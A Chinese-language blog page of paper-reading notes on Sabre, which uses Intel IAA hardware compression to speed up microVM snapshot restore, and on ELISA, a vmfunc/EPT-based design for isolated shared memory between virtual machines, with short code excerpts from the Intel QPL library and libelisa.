<p>IAA提供C接口 直接用intel提供的库</p>
<p>相对于就是最简单的压缩的接口 源数据(uint8*)&lt;–&gt;压缩后的数据(uint8*)</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">qpl_path_t</span> execution_path = qpl_path_software;</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">source</span><span class="params">(source_size, <span class="number">5</span>)</span></span>;</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">destination</span><span class="params">(source_size / <span class="number">2</span>, <span class="number">4</span>)</span></span>;</span><br><span class="line"><span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">reference</span><span class="params">(source_size, <span class="number">7</span>)</span></span>;</span><br><span class="line">std::unique_ptr&lt;<span class="type">uint8_t</span>[]&gt; job_buffer;</span><br><span class="line"><span class="type">uint32_t</span>                   size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Job initialization</span></span><br><span class="line">qpl_status status = <span class="built_in">qpl_get_job_size</span>(execution_path, &amp;size);</span><br><span class="line"><span class="keyword">if</span> (status != QPL_STS_OK) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;An error &quot;</span> &lt;&lt; status &lt;&lt; <span class="string">&quot; acquired during job size getting.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">job_buffer   = std::<span class="built_in">make_unique</span>&lt;<span class="type">uint8_t</span>[]&gt;(size);</span><br><span class="line">qpl_job* job = <span class="built_in">reinterpret_cast</span>&lt;qpl_job*&gt;(job_buffer.<span class="built_in">get</span>());</span><br><span class="line"></span><br><span class="line">status = <span class="built_in">qpl_init_job</span>(execution_path, job);</span><br><span class="line"><span class="keyword">if</span> (status != QPL_STS_OK) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;An error &quot;</span> &lt;&lt; status &lt;&lt; <span class="string">&quot; acquired during job initializing.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Performing a compression operation</span></span><br><span class="line">job-&gt;op            = qpl_op_compress;</span><br><span class="line">job-&gt;level         = qpl_default_level;</span><br><span class="line">job-&gt;next_in_ptr   = source.<span class="built_in">data</span>();</span><br><span class="line">job-&gt;next_out_ptr  = destination.<span class="built_in">data</span>();</span><br><span class="line">job-&gt;available_in  = source_size;</span><br><span class="line">job-&gt;available_out = <span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(destination.<span class="built_in">size</span>());</span><br><span class="line">job-&gt;flags         = QPL_FLAG_FIRST | QPL_FLAG_LAST | QPL_FLAG_DYNAMIC_HUFFMAN | QPL_FLAG_OMIT_VERIFY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Compression</span></span><br><span class="line">status = <span class="built_in">qpl_execute_job</span>(job);</span><br><span class="line"><span class="keyword">if</span> (status != QPL_STS_OK) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;An error &quot;</span> &lt;&lt; status &lt;&lt; <span class="string">&quot; acquired during compression.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> compressed_size = job-&gt;total_out;</span><br></pre></td></tr></table></figure>

<h3 id="IAA能力探索"><a href="#IAA能力探索" class="headerlink" title="IAA能力探索"></a>IAA能力探索</h3><p>对比用IAA硬件压缩与软件压缩的性能：</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YWQwYjU3Mzk1NGM5YjFmMTg5YjkxNTkzZjgxZjUyZDRfYXd0QzNYTWlBdVRUTGVUaEEwVUV6V2wxRkxKTk1BTlNfVG9rZW46SGtnWmJLTVdDb1FrY3p4amwyd2N2eGZYbjViXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NjQwYzQyNmIwYTBkNTZmMmI2OWFkZjQzM2FiMmQ3ZTBfZ0xLaHo1UXM3TUtZWlVFYlBlNU1IQzhDVUlpWW1maFFfVG9rZW46U2tyQ2JXWEMwb2Q0cTB4eWZRNWNnVnZybk5jXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>用硬件压缩比软件快（可以支持异步，不占用CPU cycle， 但是这个工作没用到）</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDFkZDNkNTc2NDQzY2EyOWI1MTc1ZTRmMDQ4MmRjZmVfUG95aGpkdEdQMkxjMHRZODNLSTBHN0lMYmhzQVBWMEhfVG9rZW46VnUxQ2JqT3d0bzRmUml4SnpKTWNSOFRhbnZnXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>可扩展性没问题</p>
<p>后续测试仍用single thread single job完成</p>
<p>PRS(<em>Page Request Service</em> ) IAA集成了处理page fault的功能</p>
<p>不需要操作系统先把文件内容读到内存里，可以用mmap 然后硬件通过PRS拿到数据</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NGZmNjI0MGU5MDRhNzA1NmUwMzdmNTA3MGI1MjFhMTlfcnNDMDhWSVRoaERTekp0NHFTQ2F0MTM2cldHY0RaRmVfVG9rZW46THprcmJvZ0Iyb1Eyb014OWhYRGNiTXJsbktmXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<ul>
<li>Decompress比Disk Read要快，不会拖慢整体时间</li>
<li>O_DIRECT是为了绕过page cache提高性能（REAP使用的优化方式之一）</li>
<li>Disk Read与Disk Read+Decompress重合 -&gt; decompress和disk read overlap 是streaming的操作</li>
</ul>
<p>这里对IAA的测试和分析理论上提出了应用于microVM snapshot性能提升的可行性</p>
<h2 id="sabre-design"><a href="#sabre-design" class="headerlink" title="sabre design"></a>sabre design</h2><p>扩展压缩&#x2F;解压一段数据的功能至：</p>
<ol>
<li>压缩&#x2F;解压多块内存区域</li>
<li>压缩的数据存到文件，恢复时读取再解压</li>
</ol>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ2MDEwY2M5ZGVmY2Q1NjY0MDUwM2NjN2E2ZjMwODRfSEV1aHI4cTExazVlM2w3S1RRM2FzMjN1Q1Y0cnpBVG1fVG9rZW46SUptYmI1emtNb1lhSER4dTBsdGNIS1RqbkZkXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>snapshot保存memory之外还会保存memory partition压缩前后的位置信息</p>
<p>snapshot和prefetch各提出了两种方案</p>
<h3 id="snapshot"><a href="#snapshot" class="headerlink" title="snapshot"></a>snapshot</h3><ol>
<li>每块不连续的内存先复制到一块连续的buffer上，然后压缩一次</li>
<li>每块不连续的内存独立压缩，压缩后的数据连续存到磁盘里</li>
</ol>
<h3 id="prefetch"><a href="#prefetch" class="headerlink" title="prefetch"></a>prefetch</h3><ol>
<li>解压一次，根据记录的信息恢复到不同的内存区域（通过userfaultfd，多一次memory copy 但是因为DMA连续 所以性能好）</li>
<li>根据记录的信息解压多次</li>
</ol>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="microbenchmark"><a href="#microbenchmark" class="headerlink" title="microbenchmark"></a>microbenchmark</h3><p>先和不压缩比，然后和软件压缩比</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MWI1YjQxMjVkOGQ4ODI3MmQwNmM5Y2RkMjJjNDIyNzlfVFhKa0pESmFZVzgwbzVaR0ZWVkE4R0U2YlU0SnZ2ejFfVG9rZW46UFdGR2I3ZDRlb2pIT0Z4OEhhemNva0NablVnXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>passthrough表示读不压缩的snapshot(174.5MB)</p>
<p>sparsity表示连续page大小 1表示每个page都被一个empty page隔开</p>
<p>压缩率是2.2x 所以考虑到磁盘读，最大的加速比就是2.2 sabre是1.9</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=N2M1YmViNTQ0NGJmMzIyMjk0OGNkZDA0ZDE5MGFkM2NfdERBQXpqa2RMdmJlcWhVaWtKTDEzZDlQOTREeFo5N3lfVG9rZW46SU1aOGJYOEw5b20xTUl4WkFaN2NQSzBOblFkXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>比较软件方案</p>
<ul>
<li>create：IAA最快</li>
<li>restore-single：IAA最快</li>
<li>restore-scattered: 稀疏性越弱IAA越快</li>
</ul>
<h3 id="end-to-end"><a href="#end-to-end" class="headerlink" title="end-to-end"></a>end-to-end</h3><p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjg5ZjM1NzY2NzhlNDc1YTNjM2RkYTZkNjllMDZkNzZfQ3IxVzlGMndEaW9HenRDaDlFeUdpUHNTMTBPakNSQUJfVG9rZW46SXZSWGJqMWJkb0dCaDF4bHE2TGNQWjhzbjFiXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>已经集成到firecracker中</p>
<p>使用KVM提供的dirty pages Diff Snapshot</p>
<p>数据大，粒度粗，选择用scattered（没有对比）</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YzQ2OWFkY2JkYjEyOTI3OTE0Y2E1Mjc4YjQzNTU1MjdfcERyOE1qTzdUcUNQbWJDb2N3VUtzRzIzMVd6OHJDb01fVG9rZW46Tkd0Z2JKTVlObzdNcEd4eFdsMmN1cVlRbjFmXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>baseline是snapshot 不压缩 不prefetch</p>
<ul>
<li>baseline使用on-demand paging VM load的时候耗时少 但是函数调用会触发一系列page fault</li>
<li>Sabre在VM load时需要恢复guest memory 耗时多 但是prefetch了内存 函数调用快</li>
</ul>
<p>最高64% cold start加速</p>
<p>和SOTA方案REAP比</p>
<p>REAP的working set记录的page比较分散 选择用single-chunk（没有对比）</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NWM2MmE4YjM2NDU2Mjk5ODhhZWJjNWQzY2FlNTYwZjNfaWtvWlRhZ2lrcE01Q01JelFRMjNlemdzYjZleFVEYXRfVG9rZW46WE1GbmJoaHU2b0JJUWR4TWVvQ2NIRkVpbmhlXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>Working set对于一个固定的应用来说是不变的，sabre压缩了WS file 所以性能更好了</p>
<p>以cnn-image-classification为例，压缩比为3.10 prefetch加速38.73% 又因为该场景中REAP prefetch耗时占比大 最终Sabre达到19.2%的优势</p>
<p>对function invocation占比大的场景优势不明显（这个serverless函数本身启动耗时）</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MDBiYzUxYWE0NTg0ZmM3YjIxNDZjM2FjYjU0ZDdiMmFfYzc0Tm1abU9LbzhUSDdJbk96MnUyMmFsdU9ET0NkeGFfVG9rZW46RWc3VmJsbXFwb1JOM0h4aUdsbmNzQnVMbkdkXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>创新地提出把硬件加速器IAA应用于压缩VM snapshot，并通过合理的设计成功加速了microVM cold start</p>
<h2 id="启发"><a href="#启发" class="headerlink" title="启发"></a>启发</h2><ol>
<li>IAA加速压缩&#x2F;解压是否可以应用在其他场景中？ (有正在进行的VM migration的工作<a target="_blank" rel="noopener" href="https://lore.kernel.org/all/20240319164527.1873891-1-yuan1.liu@intel.com/T/%EF%BC%89">https://lore.kernel.org/all/20240319164527.1873891-1-yuan1.liu@intel.com/T/）</a></li>
<li>探索新硬件提供的其他功能</li>
</ol>
<ul>
<li>IAA：加密、CRC offload、data filtering等<a target="_blank" rel="noopener" href="https://www.intel.com/content/www/us/en/content-details/721858/intel-in-memory-analytics-accelerator-architecture-specification.html">https://www.intel.com/content/www/us/en/content-details/721858/intel-in-memory-analytics-accelerator-architecture-specification.html</a></li>
<li>其他硬件 例如DLB<a target="_blank" rel="noopener" href="https://www.intel.cn/content/www/cn/zh/products/docs/processors/xeon-accelerated/4th-gen-xeon-scalable-processors-product-brief.html">https://www.intel.cn/content/www/cn/zh/products/docs/processors/xeon-accelerated/4th-gen-xeon-scalable-processors-product-brief.html</a></li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/09/17/papers/ELISA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/17/papers/ELISA/" class="post-title-link" itemprop="url">ELISA</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-09-17 19:48:03" itemprop="dateCreated datePublished" datetime="2024-09-17T19:48:03+08:00">2024-09-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>2.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>10 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ELISA"><a href="#ELISA" class="headerlink" title="ELISA"></a>ELISA</h1><p><a target="_blank" rel="noopener" href="https://github.com/yasukata/ELISA?tab=readme-ov-file#section-41--anywhere-page-table-apt">yasukata&#x2F;ELISA: ELISA: Exit-Less, Isolated, and Shared Access for Virtual Machines (github.com)</a></p>
<p>主要是elisa的设计实现了带隔离的共享内存 network的use case可以做到比vhost-net更好</p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>虚拟机间需要共享数据</p>
<ul>
<li>共享内存 效率高 隔离性低 guest代码不可信</li>
<li>host介入 例如hypercall 隔离性好 效率低</li>
</ul>
<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221135854799.png" alt="image-20240221135854799" style="zoom:50%;" />

<ul>
<li>share一块设备的DMA区域</li>
<li>trafficDB</li>
</ul>
<p>ELISA通过vmfunc切换EPT页表实现安全高效的资源共享</p>
<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221140438142.png" alt="image-20240221140438142" style="zoom:50%;" />

<h2 id="EPTP"><a href="#EPTP" class="headerlink" title="EPTP"></a>EPTP</h2><img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221151320704.png" alt="image-20240221151320704" style="zoom:50%;" />

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rev-omi/p/14063037.html">第10章：VT 技术（简单了解+EPT 机制） - Rev_omi - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.usenix.org/sites/default/files/conference/protected-files/atc18_slides_hua.pdf">atc18_slides_hua.pdf (usenix.org)</a></p>
<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221135313661.png" alt="image-20240221135313661" style="zoom:50%;" />

<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221135431450.png" alt="image-20240221135431450" style="zoom:50%;" />

<p>EPTP: EPT四级页表的root</p>
<p>传统hypervisor只需要为每个guest配置一套EPT就可以 intel允许配置512个</p>
<p>改完EPT以后 GPA-&gt;HPA映射改变 所有数据都变了 包括代码和页表</p>
<p>所以大部分都是不改的 只改需要改的部分 例如代码</p>
<ul>
<li>原本不能访问的 现在可以访问</li>
<li>代码段4k页结束以后 变到了新的代码段上了</li>
</ul>
<h2 id="challange"><a href="#challange" class="headerlink" title="challange"></a>challange</h2><p>EPT context 指每个EPTP对应的四级页表</p>
<p>需要保证guest 页表数据不变(否则会crash) 所以guest 页表GPA-&gt;HPA不能变</p>
<p> 所以guest改cr3必须下陷同步修改EPT？</p>
<p>修改EPT以后代码在哪？  理论：通过固定GVA去call vmfunc 实际：恶意guest可以控制页表和cr3 导致可以任意GVAcall 绕过判断</p>
<h2 id="design"><a href="#design" class="headerlink" title="design"></a>design</h2><p>三种EPT context</p>
<ul>
<li>default 不可信</li>
<li>gate 可信</li>
<li>sub 可信</li>
</ul>
<p>Manager VM：可信部分 方便用user-space的tool 代替了kernel的hypervisor 去配置EPT</p>
<h3 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h3><p>APT是为了消除CR3的trap和update开销</p>
<p>vmfunc之后 GPA-&gt;HPA映射改变 还是在guest内 因此想要执行目标代码 绕不开地址翻译</p>
<p>让所有的GPA都指向提前配置好的guest页表基地址 这样不论cr3的值是什么 都可以正确翻译</p>
<p>因此其他用到的内存 例如栈 共享变量 代码都必须在guest合法GPA之外 例如256G</p>
<h3 id="gate"><a href="#gate" class="headerlink" title="gate"></a>gate</h3><img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221135535967.png" alt="image-20240221135535967" style="zoom:50%;" />

<p><a target="_blank" rel="noopener" href="https://www.usenix.org/conference/usenixsecurity20/presentation/mi">(Mostly) Exitless VM Protection from Untrusted Hypervisor through Disaggregated Nested Virtualization | USENIX</a></p>
<p>防止VM 随意切换EPTP bypass掉可信部分 用动态修改EPTP list的技术 </p>
<p>初始化情况下 EPTP list 只有default 和gate 两个entry</p>
<p>切换到gate的时候动态加入sub到EPTP list</p>
<p>sub回到default之前再把sub从EPTP list里面删了</p>
<p>dlopen加载可信代码 映射到sub EPT</p>
<p>gate隔离开def和sub 加简单的check就可以</p>
<h2 id="network"><a href="#network" class="headerlink" title="network"></a>network</h2><p>VM-&gt;虚拟网卡-&gt;qemu&#x2F;kvm-&gt;内核网桥-&gt;物理网卡</p>
<p>[KVM 介绍（4）：I&#x2F;O 设备直接分配和 SR-IOV <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sammyliu/p/4548194.html">KVM PCI&#x2F;PCIe Pass-Through SR-IOV] - SammyLiu - 博客园 (cnblogs.com)</a></p>
<p>PCI passthrough 设备直通 一个网卡给一个虚拟机用</p>
<p>SRIOV也是设备直通 但是有一个网卡给多个虚拟机用的能力</p>
<p>virtual switch是sub context共享的 物理NIC的IO buffer和DMA是sub context共享的</p>
<p>vNIC的io buffer是def和sub共享的</p>
<p>virtual switch用了VALE&#x2F;mswitch netmap</p>
<p>VNIC driver是DPDK写的  user application也要用DPDK去通信</p>
<p>发包</p>
<ol>
<li>vNIC把数据放到IObuffer def和sub shared</li>
<li>vmfunc</li>
<li>virtual switch拷贝到目标NIC</li>
<li>virtual switch trigger sub中的physical NIC driver</li>
</ol>
<p>收包</p>
<ol>
<li>vNIC</li>
<li>vmfunc 进入sub</li>
<li>virtual switch拷贝到vNIC</li>
</ol>
<p>PCI passthrough不能被多个VM共用</p>
<p>转发逻辑完全可编程 和SRIOV不同 后者是硬件代码</p>
<p>测试用的benchmark都需要基于DPDK的用户进程</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fengfengdiandia/article/details/52869290">netmap 介绍-CSDN博客</a></p>
<p>网络包首发框架 映射网卡packet buffer到用户态</p>
<p><a target="_blank" rel="noopener" href="https://conferences.sigcomm.org/sigcomm/2017/files/tutorial-netmap/03-vale.pdf">03-vale.pdf (sigcomm.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://manpages.org/vale/4">man vale (4): a very fast Virtual Local Ethernet using the netmap API (manpages.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/ELISA?tab=readme-ov-file#section-71--vm-networking-system">yasukata&#x2F;ELISA: ELISA: Exit-Less, Isolated, and Shared Access for Virtual Machines (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-app-vmnet/blob/master/client/main.c">elisa-app-vmnet&#x2F;client&#x2F;main.c at master · yasukata&#x2F;elisa-app-vmnet (github.com)</a></p>
<ol>
<li><p>guestVM网络请求 被DPDK driver处理<a target="_blank" rel="noopener" href="https://github.com/yasukata/librte_pmd_rvif/blob/9fbd375484cef415ea61bb6b436d509dca707c87/main.c#L276-L278">librte_pmd_rvif&#x2F;main.c at 9fbd375484cef415ea61bb6b436d509dca707c87 · yasukata&#x2F;librte_pmd_rvif (github.com)</a></p>
</li>
<li><p>先拷贝数据到vNIC iobuf上 这个是def sub共享的</p>
</li>
<li><p>然后调用dpdk_rvif_io_hook<a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-app-vmnet/blob/4a9800ea488aa4ac9b057c3d98f04da35faefab1/client/main.c">elisa-app-vmnet&#x2F;client&#x2F;main.c at 4a9800ea488aa4ac9b057c3d98f04da35faefab1 · yasukata&#x2F;elisa-app-vmnet (github.com)</a> 其中do_io会调用elisa_gate_entry</p>
</li>
<li><p>触发vmfunc</p>
</li>
<li><p>进入sub的entry point 这里entry_function是rvs_fwd</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-app-vmnet/blob/4a9800ea488aa4ac9b057c3d98f04da35faefab1/server/lib/libelisa-applib-vmnet/main.c#L68">elisa-app-vmnet&#x2F;server&#x2F;lib&#x2F;libelisa-applib-vmnet&#x2F;main.c at 4a9800ea488aa4ac9b057c3d98f04da35faefab1 · yasukata&#x2F;elisa-app-vmnet (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yasukata/rvs/blob/master/rvs.c">rvs&#x2F;rvs.c at master · yasukata&#x2F;rvs (github.com)</a></p>
<p>rvs是单独实现的一个virtual switch</p>
</li>
<li><p>virtual switch主要做两件事</p>
<ul>
<li>找destination</li>
<li>拷贝数据到destination NIC的IO buffer</li>
</ul>
<p>这部分参考VALE&#x2F;mswitch实现</p>
</li>
</ol>
<h3 id="VALE"><a href="#VALE" class="headerlink" title="VALE"></a>VALE</h3><p>就是一个高性能的virtual switch</p>
<h3 id="hyperNF"><a href="#hyperNF" class="headerlink" title="hyperNF"></a>hyperNF</h3><ul>
<li>为了不增加hypervisor的TCB 把基于VALE的vswitch放在一个privilege VM中 实现转发逻辑</li>
<li>数据和代码export到hypervisor中</li>
<li>map一些数据结构给VM</li>
<li>NIC直接连接switch</li>
</ul>
<p>transmit</p>
<ol>
<li>VM 放数据到packet buffer</li>
<li>hypercall</li>
<li>VALE转发逻辑（查询dest地址 拷贝数据）</li>
<li>hypercall return</li>
</ol>
<ul>
<li>virtio&#x2F;vhost-net是通过hypervisor处理 物理NIC连的是hypervisor上的tap设备</li>
<li>elisa通过hyperNF的架构 多个VM共享物理NIC的DMA区域 例如加锁使用</li>
</ul>
<p>VALE本身就比tap快10-20倍 12年</p>
<p>hyperNF用了VALE 15年</p>
<p>发网络包的过程</p>
<ol>
<li>guest host通信</li>
<li>switch转发</li>
</ol>
<p>elisa做到的是把通信部分从vm exit变为开销更小的vmfunc 并且用自己实现的高效转发逻辑用sub EPT保护起来 同时实现了隔离性</p>
<p>baseline：</p>
<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221141207415.png" alt="image-20240221141207415" style="zoom:50%;" />



<p>elisa</p>
<img src="C:\Users\Shen\AppData\Roaming\Typora\typora-user-images\image-20240221141230092.png" alt="image-20240221141230092" style="zoom:50%;" />



<h2 id="libelisa"><a href="#libelisa" class="headerlink" title="libelisa"></a>libelisa</h2><p>最终执行流也是通过EPT映射决定的 所以如何构造EPT很关键</p>
<p>managerVM配置好EPT以后写到eptp_list 通过hypercall告诉kvm  kvm通过写vmcs配置eptp_list 然后vmfunc就可以直接用</p>
<p>elisa-util-exec会直接执行elisa__exec_init managerVM和guestVM都需要执行elisa-util-exec 这样都执行了shared的mmap</p>
<p>每个需要共享内存的guest VM作为elisa_client</p>
<ul>
<li><h4 id="elisa-server-运行在managerVM-死循环"><a href="#elisa-server-运行在managerVM-死循环" class="headerlink" title="elisa_server  运行在managerVM 死循环"></a><a target="_blank" rel="noopener" href="https://github.com/yasukata/elisa-util-exec/blob/eb8a14a132fe7f9b0e7980c7a4ab3a30ef8a465f/main.c#L67"><code>elisa_server</code></a>  运行在managerVM 死循环</h4><p>由elisa-util-exec调用到elisa_server 传入elisa__server_cb  elisa__server_exit_cb</p>
<p>fork后执行server_work</p>
<p>ELISA_APPLIB_FILE&#x3D;.&#x2F;lib&#x2F;libelisa-applib-nop&#x2F;lib.so 这个文件里面只有一个entry_function</p>
<p>server_cb(elisa__server_cb)调用elisa_create_program_map_req 解析ELF把entry_function的代码段都放到base_gpa后的一页一页</p>
<p>shared_memory的指针会被放到代码段页之后的一页</p>
<p>BASE_GPA是1&lt;&lt;37 即128G</p>
<p>正常来说8G内存范围就是0-8G 超了访问硬件就会报错<br>但是对于虚拟化 有GPA-&gt;HPA翻译 超出的部分也可以被映射到合法的HPA<br>default EPT不映射超出的部分 non-default EPT映射超出的GPA到HPA</p>
<p>src_gxa表示可能是gva也可能是gpa 实际上都是gva</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(*map_req)[*map_req_cnt].dst_gpa = <span class="number">0x1000</span> * *map_req_cnt + base_gpa;</span><br><span class="line">(*map_req)[*map_req_cnt].dst_gva = (phdr.p_vaddr &amp; (~((<span class="number">1UL</span> &lt;&lt; <span class="number">12</span>) - <span class="number">1</span>))) + <span class="number">0x1000</span> * j;</span><br><span class="line">(*map_req)[*map_req_cnt].src_gxa = (phdr.p_vaddr &amp; (~((<span class="number">1UL</span> &lt;&lt; <span class="number">12</span>) - <span class="number">1</span>))) + <span class="number">0x1000</span> * j;</span><br></pre></td></tr></table></figure>

<p>server libelisa这边的BASE_GPA是256G</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__map_req[i].dst_gva = requested_gva + 0x1000 * i;</span><br><span class="line">__map_req[i].dst_gpa = BASE_GPA + 0x1000 * i;</span><br></pre></td></tr></table></figure>

<p><code>embed_addr_to_code((void *)((uintptr_t) __RUNTIME_VALUE_2 + 2), entry_function);</code></p>
<p>把entry_function的地址写到sub_context的code中</p>
<p>setup_vcpu_ept_ctx</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assert(!gva2hpa(req[i].src_gxa, &amp;hpa));</span><br><span class="line">pt_map(&amp;ctx-&gt;pt, req[i].dst_gva, req[i].dst_gpa, req[i].pt_flags, req[i].level);</span><br><span class="line">pt_map(&amp;ctx-&gt;ept, req[i].dst_gpa, hpa, req[i].ept_flags, req[i].level);</span><br></pre></td></tr></table></figure>

<p>原先src_gva-&gt;hpa 是src_gva是已经存在的一块内存区域</p>
<p>之后dst_gva-&gt;dst_gpa-&gt;hpa 即用新的guest page table和ept 可以用dst_gva访问到这块数据</p>
<p>pt_map补全页表 建立映射 pgtbl-&gt;cnt表示四级页表中所有页表的个数 pg[0]表示root页表</p>
<p>把pt页表的映射再加到EPT中</p>
<p>只是配好了一个pt和一个ept 包括gate sub用到的代码和stack</p>
